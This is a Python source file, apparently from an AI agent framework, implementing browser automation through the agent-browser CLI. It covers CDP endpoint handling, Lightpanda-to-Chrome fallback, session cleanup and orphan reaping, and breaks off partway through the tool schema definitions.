#!/usr/bin/env python3
"""
Browser Tool Module

This module provides local Chromium automation using agent-browser CLI.

The tool uses agent-browser's accessibility tree (ariaSnapshot) for text-based
page representation, making it ideal for LLM agents without vision capabilities.

Features:
- **Local mode** (default): zero-cost headless Chromium via agent-browser.
  Works on Linux servers without a display.  One-time setup:
  ``agent-browser install`` (downloads Chromium) or
  ``agent-browser install --with-deps`` (also installs system libraries for
  Debian/Ubuntu/Docker).
- Session isolation per task ID
- Text-based page snapshots using accessibility tree
- Element interaction via ref selectors (@e1, @e2, etc.)
- Task-aware content extraction using LLM summarization
- Automatic cleanup of browser sessions

Usage:
    from tools.browser_tool import browser_navigate, browser_snapshot, browser_click

    # Navigate to a page
    result = browser_navigate("https://example.com", task_id="task_123")

    # Get page snapshot
    snapshot = browser_snapshot(task_id="task_123")

    # Click an element
    browser_click("@e5", task_id="task_123")
"""

import atexit
import functools
import json
import logging
import os
import re
import subprocess
import shutil
import sys
import tempfile
import threading
import time
import requests
from typing import Dict, Any, Optional, List, Tuple, Union
from pathlib import Path
from marlow_constants import get_marlow_home
from marlow_cli.config import cfg_get

try:
    from tools.website_policy import check_website_access
except Exception:
    check_website_access = lambda url: None  # noqa: E731 — fail-open if policy module unavailable

logger = logging.getLogger(__name__)

# Standard PATH entries for environments with minimal PATH (e.g. systemd services).
# Includes macOS Homebrew and standard Unix locations needed for agent-browser,
# npx, and node.
_SANE_PATH_DIRS = (
    "/opt/homebrew/bin",
    "/opt/homebrew/sbin",
    "/usr/local/sbin",
    "/usr/local/bin",
    "/usr/sbin",
    "/usr/bin",
    "/sbin",
    "/bin",
)
_SANE_PATH = os.pathsep.join(_SANE_PATH_DIRS)


@functools.lru_cache(maxsize=1)
def _discover_homebrew_node_dirs() -> tuple[str, ...]:
    """Find Homebrew versioned Node.js bin directories (e.g. node@20, node@24).

    When Node is installed via ``brew install node@24`` and NOT linked into
    /opt/homebrew/bin, agent-browser isn't discoverable on the default PATH.
    This function finds those directories so they can be prepended.
    """
    dirs: list[str] = []
    homebrew_opt = "/opt/homebrew/opt"
    if not os.path.isdir(homebrew_opt):
        return tuple(dirs)
    try:
        for entry in os.listdir(homebrew_opt):
            if entry.startswith("node") and entry != "node":
                bin_dir = os.path.join(homebrew_opt, entry, "bin")
                if os.path.isdir(bin_dir):
                    dirs.append(bin_dir)
    except OSError:
        pass
    return tuple(dirs)


def _browser_candidate_path_dirs() -> list[str]:
    """Return ordered browser CLI PATH candidates shared by discovery and execution."""
    marlow_home = get_marlow_home()
    marlow_node_bin = str(marlow_home / "node" / "bin")
    marlow_node_root = str(marlow_home / "node")
    marlow_nm_bin = str(marlow_home / "node_modules" / ".bin")
    return [marlow_node_bin, marlow_node_root, marlow_nm_bin, *list(_discover_homebrew_node_dirs()), *_SANE_PATH_DIRS]


def _merge_browser_path(existing_path: str = "") -> str:
    """Prepend browser-specific PATH fallbacks without reordering existing entries."""
    path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
    existing_parts = set(path_parts)
    prefix_parts: list[str] = []

    for part in _browser_candidate_path_dirs():
        if not part or part in existing_parts or part in prefix_parts:
            continue
        if os.path.isdir(part):
            prefix_parts.append(part)

    return os.pathsep.join(prefix_parts + path_parts)

# Throttle screenshot cleanup to avoid repeated full directory scans.
_last_screenshot_cleanup_by_dir: dict[str, float] = {}

# ============================================================================
# Configuration
# ============================================================================

# Default timeout for browser commands (seconds)
DEFAULT_COMMAND_TIMEOUT = 30

# Max tokens for snapshot content before summarization
SNAPSHOT_SUMMARIZE_THRESHOLD = 8000

# Commands that legitimately return empty stdout (e.g. close, record).
_EMPTY_OK_COMMANDS: frozenset = frozenset({"close", "record"})

_cached_command_timeout: Optional[int] = None
_command_timeout_resolved = False


def _get_command_timeout() -> int:
    """Return the configured browser command timeout from config.yaml.

    Reads ``config["browser"]["command_timeout"]`` and falls back to
    ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.  Result is
    cached after the first call and cleared by ``cleanup_all_browsers()``.
    """
    global _cached_command_timeout, _command_timeout_resolved
    if _command_timeout_resolved:
        return _cached_command_timeout  # type: ignore[return-value]

    _command_timeout_resolved = True
    result = DEFAULT_COMMAND_TIMEOUT
    try:
        from marlow_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg_get(cfg, "browser", "command_timeout")
        if val is not None:
            result = max(int(val), 5)  # Floor at 5s to avoid instant kills
    except Exception as e:
        logger.debug("Could not read command_timeout from config: %s", e)
    _cached_command_timeout = result
    return result


def _resolve_cdp_override(cdp_url: str) -> str:
    """Normalize a user-supplied CDP endpoint into a concrete connectable URL.

    Accepts:
    - full websocket endpoints: ws://host:port/devtools/browser/...
    - HTTP discovery endpoints: http://host:port or http://host:port/json/version
    - bare websocket host:port values like ws://host:port

    For discovery-style endpoints we fetch /json/version and return the
    webSocketDebuggerUrl so downstream tools always receive a concrete browser
    websocket instead of an ambiguous host:port URL.
    """
    raw = (cdp_url or "").strip()
    if not raw:
        return ""

    lowered = raw.lower()
    if "/devtools/browser/" in lowered:
        return raw

    discovery_url = raw
    if lowered.startswith(("ws://", "wss://")):
        if raw.count(":") == 2 and raw.rstrip("/").rsplit(":", 1)[-1].isdigit() and "/" not in raw.split(":", 2)[-1]:
            discovery_url = ("http://" if lowered.startswith("ws://") else "https://") + raw.split("://", 1)[1]
        else:
            return raw

    if discovery_url.lower().endswith("/json/version"):
        version_url = discovery_url
    else:
        version_url = discovery_url.rstrip("/") + "/json/version"

    try:
        response = requests.get(version_url, timeout=10)
        response.raise_for_status()
        payload = response.json()
    except Exception as exc:
        logger.warning("Failed to resolve CDP endpoint %s via %s: %s", raw, version_url, exc)
        return raw

    ws_url = str(payload.get("webSocketDebuggerUrl") or "").strip()
    if ws_url:
        logger.info("Resolved CDP endpoint %s -> %s", raw, ws_url)
        return ws_url

    logger.warning("CDP discovery at %s did not return webSocketDebuggerUrl; using raw endpoint", version_url)
    return raw


def _get_cdp_override() -> str:
    """Return a normalized CDP URL override, or empty string.

    Precedence is:
    1. ``BROWSER_CDP_URL`` env var (live override from ``/browser connect``)
    2. ``browser.cdp_url`` in config.yaml (persistent config)

    When either is set, Marlow skips its local launcher and connects directly
    to the supplied Chrome DevTools Protocol endpoint.
    """
    env_override = os.environ.get("BROWSER_CDP_URL", "").strip()
    if env_override:
        return _resolve_cdp_override(env_override)

    try:
        from marlow_cli.config import read_raw_config

        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict):
            return _resolve_cdp_override(str(browser_cfg.get("cdp_url", "") or ""))
    except Exception as e:
        logger.debug("Could not read browser.cdp_url from config: %s", e)

    return ""


def _get_dialog_policy_config() -> Tuple[str, float]:
    """Read ``browser.dialog_policy`` + ``browser.dialog_timeout_s`` from config.

    Returns a ``(policy, timeout_s)`` tuple, falling back to the supervisor's
    defaults when keys are absent or invalid.
    """
    # Defer imports so browser_tool can be imported in minimal environments.
    from tools.browser_supervisor import (
        DEFAULT_DIALOG_POLICY,
        DEFAULT_DIALOG_TIMEOUT_S,
        _VALID_POLICIES,
    )

    try:
        from marlow_cli.config import read_raw_config

        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {}) if isinstance(cfg, dict) else {}
        if not isinstance(browser_cfg, dict):
            return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S
        policy = str(browser_cfg.get("dialog_policy") or DEFAULT_DIALOG_POLICY)
        if policy not in _VALID_POLICIES:
            logger.debug("Invalid browser.dialog_policy=%r; using default", policy)
            policy = DEFAULT_DIALOG_POLICY
        timeout_raw = browser_cfg.get("dialog_timeout_s")
        try:
            timeout_s = float(timeout_raw) if timeout_raw is not None else DEFAULT_DIALOG_TIMEOUT_S
            if timeout_s <= 0:
                timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        except (TypeError, ValueError):
            timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        return policy, timeout_s
    except Exception:
        return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S


def _ensure_cdp_supervisor(task_id: str) -> None:
    """Start a CDP supervisor for ``task_id`` if an endpoint is reachable.

    Idempotent — delegates to ``SupervisorRegistry.get_or_start`` which skips
    when a supervisor for this ``(task_id, cdp_url)`` already exists and
    tears down + restarts on URL change. Safe to call on every
    ``browser_navigate`` / ``/browser connect`` without worrying about
    double-attach.

    Resolves the CDP URL from ``BROWSER_CDP_URL`` or ``browser.cdp_url``.

    Swallows all errors — failing to attach the supervisor must not break
    the browser session itself.  The agent simply won't see
    ``pending_dialogs`` / ``frame_tree`` fields in snapshots.
    """
    cdp_url = _get_cdp_override()
    if not cdp_url:
        return
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]

        policy, timeout_s = _get_dialog_policy_config()
        SUPERVISOR_REGISTRY.get_or_start(
            task_id=task_id,
            cdp_url=cdp_url,
            dialog_policy=policy,
            dialog_timeout_s=timeout_s,
        )
    except Exception as exc:
        logger.debug(
            "CDP supervisor attach for task=%s failed (non-fatal): %s",
            task_id,
            exc,
        )


def _stop_cdp_supervisor(task_id: str) -> None:
    """Stop the CDP supervisor for ``task_id`` if one exists. No-op otherwise."""
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]

        SUPERVISOR_REGISTRY.stop(task_id)
    except Exception as exc:
        logger.debug("CDP supervisor stop for task=%s failed (non-fatal): %s", task_id, exc)


_cached_agent_browser: Optional[str] = None
_agent_browser_resolved = False

# Lightpanda engine support.
# agent-browser v0.25.3+ supports ``--engine lightpanda`` natively.
_cached_browser_engine: Optional[str] = None
_browser_engine_resolved = False


def _browser_install_hint() -> str:
    return "npm install -g agent-browser && agent-browser install --with-deps"






def _is_local_mode() -> bool:
    """Return True when Marlow launches its own local browser."""
    return not bool(_get_cdp_override())




def _get_browser_engine() -> str:
    """Return the configured browser engine (``auto``, ``lightpanda``, or ``chrome``).

    Reads ``config["browser"]["engine"]`` once and caches the result.
    Falls back to the ``AGENT_BROWSER_ENGINE`` env var, then ``auto``.

    ``auto`` means: don't pass ``--engine`` at all (agent-browser defaults to
    Chrome).  ``lightpanda`` or ``chrome`` are forwarded as
    ``--engine <value>`` to agent-browser v0.25.3+.

    Lightpanda is 1.3-5.8x faster on navigation but has no graphical
    renderer (no screenshots).
    """
    global _cached_browser_engine, _browser_engine_resolved
    if _browser_engine_resolved:
        return _cached_browser_engine

    _browser_engine_resolved = True
    _cached_browser_engine = "auto"  # safe default

    # Config file takes priority
    try:
        from marlow_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg.get("browser", {}).get("engine")
        if val and str(val).strip():
            _cached_browser_engine = str(val).strip().lower()
    except Exception as e:
        logger.debug("Could not read browser.engine from config: %s", e)

    # Fall back to env var (only if config didn't set a value)
    if _cached_browser_engine == "auto":
        env_val = os.environ.get("AGENT_BROWSER_ENGINE", "").strip().lower()
        if env_val:
            _cached_browser_engine = env_val

    # Validate: agent-browser only accepts "chrome" and "lightpanda".
    _VALID_ENGINES = {"auto", "lightpanda", "chrome"}
    if _cached_browser_engine not in _VALID_ENGINES:
        logger.warning(
            "Unknown browser engine %r (valid: %s), falling back to 'auto'",
            _cached_browser_engine, ", ".join(sorted(_VALID_ENGINES)),
        )
        _cached_browser_engine = "auto"

    return _cached_browser_engine


def _should_inject_engine(engine: str) -> bool:
    """Return True when the engine flag should be added to agent-browser commands.

    Only inject ``--engine`` for locally launched sessions where the engine is
    explicitly set (not ``auto``).
    """
    if engine == "auto":
        return False
    return _is_local_mode()


def _using_lightpanda_engine() -> bool:
    """Return True when local browser commands are configured for Lightpanda."""
    return _get_browser_engine() == "lightpanda"


def _lightpanda_fallback_reason(engine: str, command: str, result: Dict[str, Any]) -> Optional[str]:
    """Return the user-visible reason a Lightpanda result needs Chrome fallback.

    ``None`` means no fallback should run.  The returned string is copied into
    the fallback result so CLI/TUI/gateway users can see when Marlow silently
    switched from Lightpanda to Chrome for completeness.
    """
    if engine != "lightpanda":
        return None

    # Only retry commands where Chrome can meaningfully produce a different
    # result. Session-management commands (close, record) are tied to the
    # engine's daemon and can't be retried on a different engine.
    _FALLBACK_ELIGIBLE = {"open", "snapshot", "screenshot", "eval", "click",
                          "fill", "scroll", "back", "press", "console", "errors"}
    if command not in _FALLBACK_ELIGIBLE:
        return None

    # Explicit failure
    if not result.get("success"):
        error = str(result.get("error") or "command failed").strip()
        return f"Lightpanda {command!r} failed ({error}); retried with Chrome."

    data = result.get("data", {})

    if command == "snapshot":
        snap = data.get("snapshot", "")
        # Empty or near-empty snapshots indicate Lightpanda couldn't render
        if not snap or len(snap.strip()) < 20:
            return "Lightpanda returned an empty/too-short snapshot; retried with Chrome."

    if command == "screenshot":
        # Lightpanda returns a placeholder PNG with its panda logo.
        # Since LP PR #1766 resized it to 1920x1080, the placeholder is
        # ~17 KB.  Real Chromium screenshots are typically 100 KB+.
        path = data.get("path", "")
        if path:
            try:
                size = os.path.getsize(path)
                if size < 20480:
                    logger.debug("Lightpanda screenshot is suspiciously small (%d bytes), "
                                 "triggering Chrome fallback", size)
                    return (
                        f"Lightpanda screenshot was suspiciously small ({size} bytes); "
                        "retried with Chrome."
                    )
            except OSError:
                return "Lightpanda screenshot file was missing/unreadable; retried with Chrome."

    return None


def _needs_lightpanda_fallback(engine: str, command: str, result: Dict[str, Any]) -> bool:
    """Check if a Lightpanda result should trigger an automatic Chrome fallback."""
    return _lightpanda_fallback_reason(engine, command, result) is not None


def _annotate_lightpanda_fallback(result: Dict[str, Any], reason: str) -> Dict[str, Any]:
    """Add a user-visible Chrome fallback warning to a browser command result."""
    warning = (
        "⚠ Lightpanda fallback: Chrome was used for this browser action. "
        f"{reason}"
    )
    annotated = dict(result)
    annotated["fallback_warning"] = warning
    annotated["browser_engine"] = "chrome"
    annotated["browser_engine_fallback"] = {
        "from": "lightpanda",
        "to": "chrome",
        "reason": reason,
    }
    data = annotated.get("data")
    if isinstance(data, dict):
        data = dict(data)
        data.setdefault("fallback_warning", warning)
        data.setdefault("browser_engine", "chrome")
        data.setdefault(
            "browser_engine_fallback",
            {"from": "lightpanda", "to": "chrome", "reason": reason},
        )
        annotated["data"] = data
    return annotated


def _copy_fallback_warning(target: Dict[str, Any], result: Dict[str, Any]) -> Dict[str, Any]:
    """Copy browser fallback metadata from an internal result into a tool response."""
    if result.get("fallback_warning"):
        target["fallback_warning"] = result["fallback_warning"]
        target["browser_engine"] = result.get("browser_engine")
        target["browser_engine_fallback"] = result.get("browser_engine_fallback")
    return target


def _run_chrome_fallback_command(
    task_id: str,
    command: str,
    args: List[str],
    timeout: int,
) -> Dict[str, Any]:
    """Run a browser command in a temporary Chrome session at the current URL.

    agent-browser locks the engine when a named daemon starts. Passing
    ``--engine chrome`` to the same Lightpanda ``--session`` cannot change that
    running daemon. This helper always uses a fresh temporary Chrome session,
    navigates it to the current Lightpanda URL, runs ``command``, then tears it
    down.
    """
    import uuid

    # 1. Grab the current URL from the Lightpanda session. Use
    # ``_engine_override=\"auto\"`` so this helper does not recursively trigger
    # Lightpanda→Chrome fallback if the eval call itself fails.
    url_result = _run_browser_command(
        task_id, "eval", ["window.location.href"], timeout=10, _engine_override="auto"
    )
    current_url = None
    if url_result.get("success"):
        current_url = url_result.get("data", {}).get("result", "").strip().strip('"').strip("'")
    if not current_url:
        logger.warning("Chrome fallback: could not determine current URL from LP session")
        return {"success": False, "error": "Chrome fallback failed: could not determine current URL"}

    # 2. Create a temporary Chrome session (bypasses _get_session_info's cache).
    tmp_session = f"h_cfb_{uuid.uuid4().hex[:8]}"
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        return {"success": False, "error": str(e)}

    if not _chromium_installed():
        if _running_in_docker():
            hint = (
                "Chrome fallback requires Chromium, but it is missing. "
                "You're running in Docker — rebuild the image from the latest "
                "Marlow checkout with: docker compose build --pull"
            )
        else:
            hint = (
                "Chrome fallback requires Chromium, but it is missing. Install it with: "
                "npx agent-browser install --with-deps "
                "(or: npx playwright install --with-deps chromium)"
            )
        return {"success": False, "error": hint}

    # Resolve npx when possible and otherwise let Popen report it as missing.
    if browser_cmd == "npx agent-browser":
        _npx_bin = shutil.which("npx") or "npx"
        cmd_prefix = [_npx_bin, "agent-browser"]
    else:
        cmd_prefix = [browser_cmd]
    base_args = cmd_prefix + ["--engine", "chrome", "--session", tmp_session, "--json"]

    task_socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{tmp_session}")
    os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
    browser_env = dict(__import__("agent.codex_environment", fromlist=["managed_environment"]).managed_environment().overrides()["shell_environment_policy"]["set"], AGENT_BROWSER_SOCKET_DIR=task_socket_dir)
    browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))

    if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
        browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)

    def _run_tmp(cmd: str, cmd_args: List[str]) -> Dict[str, Any]:
        full = base_args + [cmd] + cmd_args
        # Use temp-file stdout/stderr pattern (same as _run_browser_command)
        # to avoid pipe hang from agent-browser daemon inheriting fds.
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{cmd}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{cmd}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            proc = subprocess.Popen(
                full, stdout=stdout_fd, stderr=stderr_fd,
                stdin=subprocess.DEVNULL, env=browser_env,
                cwd=str(__import__("agent.codex_environment", fromlist=["managed_environment"]).managed_environment().workspace),
            )
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)
        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            return {"success": False, "error": f"Chrome fallback '{cmd}' timed out"}
        try:
            with open(stdout_path, "r", encoding="utf-8") as f:
                stdout = f.read().strip()
            if stdout:
                return json.loads(stdout.split("\n")[-1])
        except Exception as exc:
            logger.debug("Chrome fallback tmp cmd '%s' error: %s", cmd, exc)
        finally:
            for pth in (stdout_path, stderr_path):
                try:
                    os.unlink(pth)
                except OSError:
                    pass
        return {"success": False, "error": f"Chrome fallback '{cmd}' failed"}

    try:
        # 3. Navigate Chrome to the same URL.
        nav = _run_tmp("open", [current_url])
        if not nav.get("success"):
            logger.warning("Chrome fallback: navigate failed: %s", nav.get("error"))
            return {"success": False, "error": f"Chrome fallback navigate failed: {nav.get('error')}"}

        # 4. Run the requested command in Chrome.
        return _run_tmp(command, args)

    finally:
        # 5. Tear down the temporary Chrome session.
        try:
            _run_tmp("close", [])
        except Exception:
            pass
        # Clean up socket directory
        import shutil as _shutil
        _shutil.rmtree(task_socket_dir, ignore_errors=True)


def _chrome_fallback_screenshot(
    task_id: str,
    args: List[str],
    timeout: int,
) -> Dict[str, Any]:
    """Take a screenshot using a temporary Chrome session."""
    return _run_chrome_fallback_command(task_id, "screenshot", args, timeout)






def _navigation_session_key(task_id: str, url: str) -> str:
    """Return the single retained session key for a task."""
    del url
    return task_id or "default"


def _last_session_key(task_id: str) -> str:
    """Return the session key to use for a non-nav browser tool call.

    If a previous ``browser_navigate`` on this task_id set a last-active key,
    use it so snapshot/click/fill/etc. hit the same session.  Otherwise fall
    back to the bare task_id (matches original behavior for tasks that never
    triggered hybrid routing).
    """
    if task_id is None:
        task_id = "default"
    return _last_active_session_key.get(task_id, task_id)




def _socket_safe_tmpdir() -> str:
    """Return a short temp directory path suitable for Unix domain sockets.

    macOS sets ``TMPDIR`` to ``/var/folders/xx/.../T/`` (~51 chars).  When we
    append ``agent-browser-marlow_…`` the resulting socket path exceeds the
    104-byte macOS limit for ``AF_UNIX`` addresses, causing agent-browser to
    fail with "Failed to create socket directory" or silent screenshot failures.

    Linux ``tempfile.gettempdir()`` already returns ``/tmp``, so this is a
    no-op there.  On macOS we bypass ``TMPDIR`` and use ``/tmp`` directly
    (symlink to ``/private/tmp``, sticky-bit protected, always available).
    """
    if sys.platform == "darwin":
        return "/tmp"
    return tempfile.gettempdir()


# Track local or attached-CDP sessions per task ID.
_active_sessions: Dict[str, Dict[str, str]] = {}
_recording_sessions: set = set()
_last_active_session_key: Dict[str, str] = {}

# Flag to track if cleanup has been done
_cleanup_done = False

# =============================================================================
# Inactivity Timeout Configuration
# =============================================================================

# Session inactivity timeout (seconds) - cleanup if no activity for this long
# Default: 5 minutes. Needs headroom for LLM reasoning between browser commands,
# especially when subagents are doing multi-step browser tasks.
BROWSER_SESSION_INACTIVITY_TIMEOUT = int(os.environ.get("BROWSER_INACTIVITY_TIMEOUT", "300"))

# Track last activity time per session
_session_last_activity: Dict[str, float] = {}

# Background cleanup thread state
_cleanup_thread = None
_cleanup_running = False
# Protects _session_last_activity AND _active_sessions for thread safety
# (subagents run concurrently via ThreadPoolExecutor)
_cleanup_lock = threading.Lock()


def _emergency_cleanup_all_sessions():
    """
    Emergency cleanup of all active browser sessions.
    Called on process exit or interrupt to prevent orphaned sessions.

    Also runs the orphan reaper to clean up daemons left behind by previously
    crashed marlow processes — this way every clean marlow exit sweeps
    accumulated orphans, not just ones that actively used the browser tool.
    """
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True

    # Clean up this process's own sessions first, so their owner_pid files
    # are removed before the reaper scans.
    if _active_sessions:
        logger.info("Emergency cleanup: closing %s active session(s)...",
                    len(_active_sessions))
        try:
            cleanup_all_browsers()
        except Exception as e:
            logger.error("Emergency cleanup error: %s", e)
        finally:
            with _cleanup_lock:
                _active_sessions.clear()
                _session_last_activity.clear()
                _recording_sessions.clear()

    # Sweep orphans from other crashed marlow processes.  Safe even if we
    # never used the browser — uses owner_pid liveness to avoid reaping
    # daemons owned by other live marlow processes.
    try:
        _reap_orphaned_browser_sessions()
    except Exception as e:
        logger.debug("Orphan reap on exit failed: %s", e)


# Register cleanup via atexit only.  Previous versions installed SIGINT/SIGTERM
# handlers that called sys.exit(), but this conflicts with prompt_toolkit's
# async event loop — a SystemExit raised inside a key-binding callback
# corrupts the coroutine state and makes the process unkillable.  atexit
# handlers run on any normal exit (including sys.exit), so browser sessions
# are still cleaned up without hijacking signals.
atexit.register(_emergency_cleanup_all_sessions)


# =============================================================================
# Inactivity Cleanup Functions
# =============================================================================

def _cleanup_inactive_browser_sessions():
    """
    Clean up browser sessions that have been inactive for longer than the timeout.

    This function is called periodically by the background cleanup thread to
    automatically close sessions that haven't been used recently.
    """
    current_time = time.time()
    sessions_to_cleanup = []

    with _cleanup_lock:
        for task_id, last_time in list(_session_last_activity.items()):
            if current_time - last_time > BROWSER_SESSION_INACTIVITY_TIMEOUT:
                sessions_to_cleanup.append(task_id)

    for task_id in sessions_to_cleanup:
        try:
            elapsed = int(current_time - _session_last_activity.get(task_id, current_time))
            logger.info("Cleaning up inactive session for task: %s (inactive for %ss)", task_id, elapsed)
            cleanup_browser(task_id)
            with _cleanup_lock:
                if task_id in _session_last_activity:
                    del _session_last_activity[task_id]
        except Exception as e:
            logger.warning("Error cleaning up inactive session %s: %s", task_id, e)


def _write_owner_pid(socket_dir: str, session_name: str) -> None:
    """Record the current marlow PID as the owner of a browser socket dir.

    Written atomically to ``<socket_dir>/<session_name>.owner_pid`` so the
    orphan reaper can distinguish daemons owned by a live marlow process
    (don't reap) from daemons whose owner crashed (reap).  Best-effort —
    an OSError here just falls back to the legacy ``tracked_names``
    heuristic in the reaper.
    """
    try:
        path = os.path.join(socket_dir, f"{session_name}.owner_pid")
        with open(path, "w", encoding="utf-8") as f:
            f.write(str(os.getpid()))
    except OSError as exc:
        logger.debug("Could not write owner_pid file for %s: %s",
                     session_name, exc)


def _reap_orphaned_browser_sessions():
    """Scan for orphaned agent-browser daemon processes from previous runs.

    When the Python process that created a browser session exits uncleanly
    (SIGKILL, crash, gateway restart), the in-memory ``_active_sessions``
    tracking is lost but the node + Chromium processes keep running.

    This function scans the tmp directory for ``agent-browser-*`` socket dirs
    left behind by previous runs, reads the daemon PID files, and kills any
    daemons whose owning marlow process is no longer alive.

    Ownership detection priority:
      1. ``<session>.owner_pid`` file (written by current code) — if the
         referenced marlow PID is alive, leave the daemon alone regardless
         of whether it's in *this* process's ``_active_sessions``.  This is
         cross-process safe: two concurrent marlow instances won't reap each
         other's daemons.
      2. Fallback for daemons that predate owner_pid: check
         ``_active_sessions`` in the current process.  If not tracked here,
         treat as orphan (legacy behavior).

    Safe to call from any context — atexit, cleanup thread, or on demand.
    """
    import glob

    tmpdir = _socket_safe_tmpdir()
    pattern = os.path.join(tmpdir, "agent-browser-h_*")
    socket_dirs = glob.glob(pattern)
    # Also pick up CDP sessions
    socket_dirs += glob.glob(os.path.join(tmpdir, "agent-browser-cdp_*"))
    if not socket_dirs:
        return

    # Build set of session_names currently tracked by this process (fallback path)
    with _cleanup_lock:
        tracked_names = {
            info.get("session_name")
            for info in _active_sessions.values()
            if info.get("session_name")
        }

    reaped = 0
    for socket_dir in socket_dirs:
        dir_name = os.path.basename(socket_dir)
        # dir_name is "agent-browser-{session_name}"
        session_name = dir_name.removeprefix("agent-browser-")
        if not session_name:
            continue

        # Ownership check: prefer owner_pid file (cross-process safe).
        owner_pid_file = os.path.join(socket_dir, f"{session_name}.owner_pid")
        owner_alive: Optional[bool] = None  # None = owner_pid missing/unreadable
        if os.path.isfile(owner_pid_file):
            try:
                owner_pid = int(Path(owner_pid_file).read_text(encoding="utf-8").strip())
                from gateway.status import _pid_exists
                owner_alive = _pid_exists(owner_pid)
            except (ValueError, OSError):
                owner_alive = None  # corrupt file — fall through

        if owner_alive is True:
            # Owner is alive — this session belongs to a live marlow process.
            continue

        if owner_alive is None:
            # No owner_pid file (legacy daemon).  Fall back to in-process
            # tracking: if this process knows about the session, leave alone.
            if session_name in tracked_names:
                continue

        # owner_alive is False (dead owner) OR legacy daemon not tracked here.
        pid_file = os.path.join(socket_dir, f"{session_name}.pid")
        if not os.path.isfile(pid_file):
            # No daemon PID file — just a stale dir, remove it
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        try:
            daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
        except (ValueError, OSError):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # Check if the daemon is still alive.
        from gateway.status import _pid_exists
        if not _pid_exists(daemon_pid):
            shutil.rmtree(socket_dir, ignore_errors=True)
            continue

        # Daemon is alive and its owner is dead (or legacy + untracked).  Reap.
        # Use the process-tree termination helper so Chromium children
        # (renderer, GPU, etc.) are cleaned up, not just the daemon parent.
        try:
            from tools.process_registry import ProcessRegistry
            ProcessRegistry._terminate_host_pid(daemon_pid)
            logger.info("Reaped orphaned browser daemon PID %d (session %s)",
                        daemon_pid, session_name)
            reaped += 1
        except (ProcessLookupError, PermissionError, OSError):
            pass

        # Clean up the socket directory
        shutil.rmtree(socket_dir, ignore_errors=True)

    if reaped:
        logger.info("Reaped %d orphaned browser session(s) from previous run(s)", reaped)


def _browser_cleanup_thread_worker():
    """
    Background thread that periodically cleans up inactive browser sessions.

    Runs every 30 seconds and checks for sessions that haven't been used
    within the BROWSER_SESSION_INACTIVITY_TIMEOUT period.
    On first run, also reaps orphaned sessions from previous process lifetimes.
    """
    # One-time orphan reap on startup
    try:
        _reap_orphaned_browser_sessions()
    except Exception as e:
        logger.warning("Orphan reap error: %s", e)

    while _cleanup_running:
        try:
            _cleanup_inactive_browser_sessions()
        except Exception as e:
            logger.warning("Cleanup thread error: %s", e)

        # Sleep in 1-second intervals so we can stop quickly if needed
        for _ in range(30):
            if not _cleanup_running:
                break
            time.sleep(1)


def _start_browser_cleanup_thread():
    """Start the background cleanup thread if not already running."""
    global _cleanup_thread, _cleanup_running

    with _cleanup_lock:
        if _cleanup_thread is None or not _cleanup_thread.is_alive():
            _cleanup_running = True
            _cleanup_thread = threading.Thread(
                target=_browser_cleanup_thread_worker,
                daemon=True,
                name="browser-cleanup"
            )
            _cleanup_thread.start()
            logger.info("Started inactivity cleanup thread (timeout: %ss)", BROWSER_SESSION_INACTIVITY_TIMEOUT)


def _stop_browser_cleanup_thread():
    """Stop the background cleanup thread."""
    global _cleanup_running
    _cleanup_running = False
    if _cleanup_thread is not None:
        _cleanup_thread.join(timeout=5)


def _update_session_activity(task_id: str):
    """Update the last activity timestamp for a session."""
    with _cleanup_lock:
        _session_last_activity[task_id] = time.time()


# Register cleanup thread stop on exit
atexit.register(_stop_browser_cleanup_thread)


# ============================================================================
# Tool Schemas
# ============================================================================

BROWSER_TOOL_SCHEMAS = [
    {
        "name": "browser_navigate",
        "description": "Navigate to a URL in the browser. Initializes the session and loads the page. Must be called before other browser tools. For simple information retrieval, prefer web_search or web_extract (faster, cheaper). For plain-text endpoints — URLs ending in .md, .txt, .json, .yaml, .yml, .csv, .xml, raw.githubusercontent.com, or any documented API endpoint — prefer curl via the terminal tool or web_extract; the browser stack is overkill and much slower for these. Use browser tools when you need to interact with a page (click, fill forms, dynamic content). Returns a compact page snapshot with interactive elements and ref IDs — no need to call browser_snapshot separately after navigating.",
        "parameters": {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "The URL to navigate to (e.g., 'https://example.com')"
                }
            },
            "required": ["url"]
        }
    },
    {
        "name": "browser_snapshot",
